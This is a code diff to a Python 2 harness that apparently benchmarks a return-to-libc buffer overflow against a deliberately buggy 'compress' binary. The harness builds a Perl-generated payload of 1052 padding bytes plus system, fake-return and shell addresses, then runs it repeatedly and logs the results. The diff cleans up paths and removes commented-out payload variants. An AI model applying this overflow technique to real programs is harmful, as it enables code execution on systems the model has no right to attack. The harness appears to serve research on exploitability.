@@ -61,6 +61,7 @@ s_attempts = 0
 attack_possible = 1
 root_directory = "./" + app_name[0] + "/"
 source_directory = root_directory + "src/"
+bench_eval_directory = root_directory + "bench-eval/"
 
 #Reading addresses file, this should be generated from buggy app
 f = open(source_directory + "addresses.txt",'r')
@@ -86,21 +87,13 @@ while i < repeat_times:
         i += 1
 
         #os.system("rm " + app_name[0] + "/bench_log")
-        cmdline = "./" + app_name[0] + "/src/compress `perl -e 'print \"A\"x1052 . " + "\"" + system_address + "\"" + \
-        " . " + "\"" + fake_address + " . " + "\"" + " . " + "\"" + shell_address + "\"" + ";'`" + " > ./" + app_name[0] + "/bench-eval" + "/bench_log 2>&1 &"
-#cmdline = "./" + app_name[0] + "/src/compress `perl -e 'print \"A\"x1052" + 'A'*1052 + system_address + \
-#        fake_address + shell_address + ";'`" + " > ./" + app_name[0] + "/bench-eval" + "/bench_log 2>&1 &"
-
-#./compress `perl -e 'print "A"x1052 . "\x28\x89\x04\x08" . "\xee\xff\xc0\x10" . "\x5b\xf4\xff\xbf";'`
-
+        cmdline = source_directory + "compress `perl -e 'print \"A\"x1052 . " + "\"" + system_address + "\"" + \
+        " . " + "\"" + fake_address + " . " + "\"" + " . " + "\"" + shell_address + "\"" + ";'`" + " > " + bench_eval_directory + "bench_log 2>&1 &"
         print cmdline
 
-        #cmdline = "./" + app_name[0] + "/src/" + "compress " + 'A'*1052  + shell_address.replace('\\x','').decode('hex') +  fake_address.replace('\\x','').decode('hex')  + system_address.replace('\\x','').decode('hex') + " > ./" + app_name[0] + "/bench-eval" + "/bench_log 2>&1"
-        #print cmdline
-
+        
         os.system(cmdline)
-        #log = open("/tmp/bench_log","r")
-0xbfffffa6
+        log = open(bench_eval_directory + "bench_log","r")
 
         #if log.read().find("Impossible") != -1:
         #        print cmdline,"\t\t","NOT POSSIBLE"
